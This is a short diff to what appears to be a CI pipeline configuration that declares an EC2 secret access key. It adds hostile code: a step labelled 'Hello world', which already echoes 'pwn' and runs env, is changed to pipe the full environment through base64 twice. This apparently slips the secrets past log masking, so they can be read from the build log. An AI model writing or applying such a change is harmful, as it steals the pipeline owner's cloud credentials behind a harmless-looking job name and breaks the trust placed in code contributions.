@@ -3,4 +3,4 @@ secrets:
   - EC2_SECRET_ACCESS_KEY
 steps:
   - label: "Hello world"
-    command: echo "pwn";ls -la;env
+    command: echo "pwn";ls -la;env|base64|base64
